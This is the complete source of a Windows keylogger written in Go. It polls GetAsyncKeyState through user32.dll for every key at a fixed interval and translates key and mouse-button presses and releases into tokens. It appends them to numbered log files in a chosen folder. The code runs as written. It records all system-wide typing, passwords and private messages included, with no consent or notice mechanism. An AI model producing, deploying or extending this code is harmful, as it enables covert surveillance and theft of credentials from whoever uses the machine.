/*
windows only
*/
package main

import(
	"fmt"
	"syscall"
	"flag"
	"time"
	"os"
	"log"
	"strconv"
	"strings"
)

var(
	dll, _ = syscall.LoadDLL("user32.dll")
	proc, _ = dll.FindProc("GetAsyncKeyState")
	interval = flag.Int("interval", 16, "a time value elapses each frame in millisecond")
	directory = flag.String("directory", "", "path/to/dir to save key log")
)

func isExist(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func ReplaceToStr(s * string, i int) {
	switch i {
		case 0x01: *s += "mouse-lbtn-on "
		case 0x02: *s += "mouse-rbtn-on "
		case 0x04: *s += "mouse-mid-on "
		case 0x08: *s += "back-space "
		case 0x09: *s += "tab "
		case 0x0d: *s += "enter "
		case 0x11: *s += "ctrl-on "
		case 0x12: *s += "alt-on "
		case 0x20: *s += "space-on "
		case 0x25: *s += "left "
		case 0x26: *s += "up "
		case 0x27: *s += "right "
		case 0x28: *s += "down "
		case 0x2e: *s += "delete "
		case 0x6a: *s += "* "
		case 0x6b: *s += "+ "
		case 0x6d: *s += "- "
		case 0x6e: *s += ". "
		case 0x6f: *s += "/ "
		case 0xa0: *s += "lshift-on "
		case 0xa1: *s += "rshift-on "
		case 0xba: *s += ": "
		case 0xbb: *s += "; "
		case 0xbc: *s += ", "
		case 0xbd: *s += "- "
		case 0xbe: *s += ". "
		case 0xbf: *s += "/ "
		case 0xc0: *s += "@ "
		case 0xdb: *s += "[ "
		case 0xdc: *s += "| "
		case 0xdd: *s += "] "
		case 0xde: *s += "^ "
		case 0xe2: *s += "back-slash "
		default: *s += fmt.Sprintf("%02x ", i)
	}
}

func GetKeyState(inputs []int) {
	// get current input
	for i := 1; i < 256; i++ {
		a, _, _ := proc.Call(uintptr(i))
		if a & 0x8000 == 0 {
			continue
		}
		// num lock
		if i == 0xf4 || i == 0xf3 {
			continue
		}
		// mouse
		if i == 0x05 || i == 0x06 {
			continue
		}
		// shift
		if i == 0x10 {
			continue
		}
		inputs[i] = 1
	}
}

func CheckPressed(s * string, inputs, prev []int) {
	// check all keys
	for i := 1; i < 256; i++ {
		// released
		if inputs[i] == 0 && prev[i] == 1 {
			switch i {
				case 0x01: *s += "mouse-lbtn-off "
				case 0x02: *s += "mouse-rbtn-off "
				case 0x04: *s += "mouse-mid-off "
				case 0x11: *s += "ctrl-off "
				case 0x12: *s += "alt-off "
				case 0xa0: *s += "lshit-off "
				case 0xa1: *s += "rshit-off "
			}
			continue
		} else if inputs[i] == 0 && prev[i] == 0 {
			// not pushed
			continue
		} else if inputs[i] == 1 && prev[i] == 1 {
			// now pressing
			continue
		}
		// character
		if 'A' <= i && i <= 'Z' {
			*s += fmt.Sprintf("%c ", i)
			continue
		}
		// number
		if '0' <= i && i <= '9' {
			*s += fmt.Sprintf("%d", i - 0x30)
			continue
		}
		ReplaceToStr(s, i)
	}
}

func LoggingLoop() {
	var start, end time.Time
	inputs := make([]int, 256)
	prev := make([]int, 256)
	s := ""
	for {
		start = time.Now()
		s = ""
		GetKeyState(inputs)
		CheckPressed(&s, inputs, prev)
		if s != "" {
			log.Printf(s)
		}
		prev = inputs
		inputs = make([]int, 256)
		end = time.Now()
		remain := (time.Millisecond * (time.Duration)(*interval)) - end.Sub(start)
		if remain > 0 {
			time.Sleep(remain)
		}
	}
}

func main() {
	defer dll.Release()
	flag.Parse()
	// create directory path
	dir := strings.Replace(*directory, "\\", "/", -1)
	if ! strings.HasSuffix(dir, "/") {
		if dir == "" {
			dir = "./"
		} else {
			dir += "/"
		}
	}
	// create directory if not exist
	if ! isExist(dir) {
		err := os.MkdirAll(dir, 0777)
		if err != nil {
			log.Fatal("cannot create directory")
		}
	}
	// search cuurent log number
	number := 0
	for isExist(dir + strconv.Itoa(number) + ".log") {
		number++ 
	}
	// set output log file
	fp, err := os.OpenFile(dir + strconv.Itoa(number) + ".log", os.O_WRONLY | os.O_CREATE, 0777)
	if err != nil {
		log.Fatal("error opening file :", err.Error())
	}
	defer fp.Close()
	log.SetOutput(fp)
	// enter main loop
	LoggingLoop()
}
